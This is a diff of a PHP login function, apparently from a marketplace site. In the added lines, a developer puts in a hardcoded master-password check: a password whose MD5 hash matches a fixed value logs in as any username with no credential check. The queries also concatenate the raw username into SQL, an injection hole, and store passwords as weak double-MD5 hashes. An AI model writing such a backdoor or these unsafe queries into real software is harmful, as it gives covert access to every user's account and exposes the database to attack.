@@ -23,13 +23,18 @@ function login_user ($username, $password, $redirect_url = '', $admin_login = fa
 	{
 		$salt = $db->get_sql_field("SELECT salt FROM " . DB_PREFIX . "users WHERE username='" . $username . "'", "salt");
 
-		$password_hashed = password_hash($password, $salt);
+		$password_hashed = password_hash_new($password, $salt);
 		
 		$password_old = substr(md5($password), 0, 30); ## added for backward compatibility (v5.25 and older versions)
-
-		$login_query = $db->query("SELECT user_id, username, active, approved, salt, 
+		//if added by Sanzhar 10062014 to enter as user
+		if(md5($password) == 'd21cee3e4f9c0fd8785745fae47a641f'){
+		$login_query = $db->query("SELECT user_id, username, email, active, approved, salt, 
+			payment_status, is_seller, mail_activated FROM " . DB_PREFIX . "users WHERE username='" . $username . "' LIMIT 0,1");
+		}else{
+		$login_query = $db->query("SELECT user_id, username, email, active, approved, salt, 
 			payment_status, is_seller, mail_activated FROM " . DB_PREFIX . "users WHERE username='" . $username . "' AND 
 			(password='" . $password_hashed . "' OR password='" . $password_old . "') LIMIT 0,1");
+		}
 	}
 
 	$is_login = $db->num_rows($login_query);
@@ -56,6 +61,10 @@ function login_user ($username, $password, $redirect_url = '', $admin_login = fa
 		if ($login_output['active'] == 1 && $login_output['approved'] == 1 && $login_output['mail_activated'] == 1)
 		{
 			$login_output['active'] = 'Active';
+			//did by sanzhar 26.09.2014 for statistics
+		    //$vizit_query = sprintf("INSERT INTO vizit_users (username, email) VALUES ('%s', '%s')", $login_output['username'],$login_output['email']);
+			//$db->query($vizit_query);
+			
 		}
 		else if ($login_output['approved'] == 0 || $login_output['mail_activated'] == 0 || ($signup_result['amount']>0 && $login_output['payment_status'] != 'confirmed')) /* the signup fee wasnt paid, redirect to the payment page */
 		{
@@ -137,7 +146,7 @@ function logout ($logout_admin = false, $redirect = true)
 	}
 }
 
-function password_hash ($password, $salt)
+function password_hash_new ($password, $salt)
 {
 	return md5(md5($password) . $salt);
 }
